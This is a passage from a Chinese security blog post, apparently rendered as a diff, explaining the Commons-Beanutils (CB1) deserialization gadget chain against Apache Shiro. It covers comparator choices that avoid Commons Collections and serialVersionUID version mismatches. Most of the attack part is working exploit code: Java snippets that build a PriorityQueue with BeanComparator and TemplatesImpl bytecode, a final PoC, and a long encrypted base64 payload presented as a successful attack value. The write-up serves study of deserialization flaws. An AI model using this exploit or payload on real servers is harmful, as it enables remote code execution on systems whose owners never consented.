+<p>但是，构造队列<code>compare</code>为空时，添加元素时会因为没有比较器报错，于是，沿用了<code>CC4</code>中使用的无害的<code>TransformingComparator</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br></pre></td></tr></table></figure>
+
+<p>而且我们在最后<strong>反射</strong>修改了该类对象，<strong>不会影响到反序列化时环境中没有</strong><code>Commons Collections</code>依赖</p>
+<p>这也是一种构造危险链的方法</p>
+<ul>
+<li><code>BeanComparator</code>中默认<code>Commons Collections</code>依赖</li>
+</ul>
+<p><code>BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);</code></p>
+<p>这里，我们构造<code>BeanComparator</code>时，使用的单参数构造方法</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161110124.png" alt="image-20260216111011048" style="zoom:67%;" />
+
+<p>但是，这里这个默认<code>comparator</code>是用到了<code>Commons Collections</code>中的类</p>
+<p><code>org/apache/commons/collections/comparators/ComparableComparator.java</code></p>
+<p>而在进行<code>shiro</code>反序列化攻击时，<code>shiro</code>环境默认时没有<code>commons collections</code>依赖的</p>
+<p>于是找一个公开构造器方法并且实现<code>Comparator</code>接口的类,而且他也在<code>shiro</code>默认依赖环境的</p>
+<p>也就是<code>com/sun/org/apache/xml/internal/security/c14n/helper/AttrCompare.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><code>PriorityQueue</code>初始化另外一种思路</li>
+</ul>
+<p>发现<code>org/apache/commons/beanutils/BeanComparator.java</code></p>
+<p>研究发现这个类的<code>compare</code>方法</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161716842.png" alt="image-20260216171622707" style="zoom:67%;" />
+
+<p><code>property</code>为<code>null</code>时，直接调用比较器比较</p>
+<p>因此，我们可以直接传入一个<code>property</code>为<code>null</code>的<code>BeanComparator</code>，然后添加俩个数字类型对象（直接添加恶意类会报错，原因比较器无法比较），之后再通过反射修改，最后在反序列化时爆发我们的炸弹</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,obj&#125;);</span><br><span class="line"></span><br><span class="line">serialize(queue);</span><br><span class="line">System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+<p>同时，这里依旧会产生之前的问题，调用<code>commons collections</code>中的比较器，这里我们选取的是<code>CaseInsensitiveComparator</code>这个比较器，之前的<code>AttrCompare</code>无法比较数字类型，通过以下获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.CASE_INSENSITIVE_ORDER</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161734336.png" alt="image-20260216173426195"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\小川\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改内部属性</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//PropertyUtils.getProperty(obj,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,obj&#125;);</span><br><span class="line"></span><br><span class="line">serialize(queue);</span><br><span class="line">System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161725240.png" alt="image-20260216172521087" style="zoom:50%;" />
+
+<ul>
+<li><strong>最后一个点就是要对应版本，ys 工具中生成的 CB 链是在1.9.2，我们 shiro 中式1.8.3</strong></li>
+</ul>
+<p>当我们发送版本不对应时报错信息</p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602161654866.png" alt="image-20260216165457623" style="zoom:50%;" />
+
+<p>在 Java 中，当一个对象需要被序列化（变成二进制流）时，Java 会给这个类打上一个“指纹”或者说“身份证号”，这个号码就是 <strong><code>serialVersionUID</code></strong></p>
+<p>版本不对应时，这个<code>UID</code>不同，因此报错，无法发生反序列化漏洞</p>
+<h2 id="三、终结"><a href="#三、终结" class="headerlink" title="三、终结"></a>三、终结</h2><h3 id="1-POC"><a href="#1-POC" class="headerlink" title="1.POC"></a>1.<code>POC</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\小川\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改内部属性</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(obj,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"></span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">serialize(queue);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+<p><strong>加密</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
+
+<p><strong>实现成功</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602160919287.png" alt="image-20260216091917161" style="zoom:50%;" />
+
+<h3 id="2-逻辑"><a href="#2-逻辑" class="headerlink" title="2.逻辑"></a>2.逻辑</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject</span><br><span class="line">	PriorityQueue#heapify</span><br><span class="line">		PriorityQueue#siftDown</span><br><span class="line">			PriorityQueue#siftDownUsingComparator</span><br><span class="line">				BeanComparator#compare</span><br><span class="line"></span><br><span class="line">    PropertyUtils.getProperty( templatesImpl, <span class="string">&quot;outputProperties&quot;</span> );</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line"><span class="comment">//getTransletInstance()在调用完defineTransletClasses()方法后，对其返回的类做了实例化，从而执行我们类中的静态代码块</span></span><br><span class="line"></span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/">chuanchuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/2026/02/16/shiro_CB/">https://zc-18.github.io/2026/02/16/shiro_CB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zc-18.github.io/" target="_blank">十七.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/shiro%E6%BC%8F%E6%B4%9E/">shiro漏洞</a></div><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/16/shiro550/" title="java安全-shiro550漏洞"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101918388.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java安全-shiro550漏洞</div></div><div class="info-2"><div class="info-item-1">java安全中shiro反序列化漏洞，编写了URLDNS链与CC11链</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/16/shiro550/" title="java安全-shiro550漏洞"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101918388.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-16</div><div class="info-item-2">java安全-shiro550漏洞</div></div><div class="info-2"><div class="info-item-1">java安全中shiro反序列化漏洞，编写了URLDNS链与CC11链</div></div></div></a><a class="pagination-related" href="/2025/12/13/fanxuliehau/" title="java安全-反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-13</div><div class="info-item-2">java安全-反序列化</div></div><div class="info-2"><div class="info-item-1">java安全中反序列化初识别部分，java的大部分漏洞都与他有关。</div></div></div></a><a class="pagination-related" href="/2026/01/06/CC1-Chain/" title="java安全-CC1"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855372.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-CC1</div></div><div class="info-2"><div class="info-item-1">java安全中CC1链，这个链是jdk8u71之前的漏洞，能达到getshell的效果。</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101920827.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC2</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC2，在CC4逻辑上修改的后半段，没有使用数组的CC链。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101855555.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC1进阶</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC3-Gadget/" title="java安全-CC3"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010128075.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC3</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC3，使用类加载的方式，实现RCE。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="author-info-name">chuanchuan</div><div class="author-info-description">慢吞吞的小孩也会有自己的玫瑰海.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zc-18/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/zc-18/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2401_87508420" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2890792376@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8-CB1%E9%93%BE"><span class="toc-text">java安全-CB1链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Apache-Commons-Beanutils"><span class="toc-text">一、Apache Commons Beanutils</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-BeanUtils"><span class="toc-text">1.BeanUtils</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-getProperty%E6%96%B9%E6%B3%95"><span class="toc-text">2.getProperty方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">二、漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%B1%E9%99%A9%E7%B1%BB"><span class="toc-text">1.危险类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%93%BE%E6%8E%A5%E7%82%B9"><span class="toc-text">2.链接点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-text">3.入口类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%86%E8%8A%82%E7%82%B9"><span class="toc-text">4.细节点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%BB%88%E7%BB%93"><span class="toc-text">三、终结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-POC"><span class="toc-text">1.POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%BB%E8%BE%91"><span class="toc-text">2.逻辑</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/shiro_CB/" title="java安全-CB链"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan9.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CB链"/></a><div class="content"><a class="title" href="/2026/02/16/shiro_CB/" title="java安全-CB链">java安全-CB链</a><time datetime="2026-02-16T10:00:10.000Z" title="发表于 2026-02-16 18:00:10">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/shiro550/" title="java安全-shiro550漏洞"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101918388.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-shiro550漏洞"/></a><div class="content"><a class="title" href="/2026/02/16/shiro550/" title="java安全-shiro550漏洞">java安全-shiro550漏洞</a><time datetime="2026-02-16T10:00:02.000Z" title="发表于 2026-02-16 18:00:02">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/10/skyDay12/" title="苍穹外卖-DAY12"><img 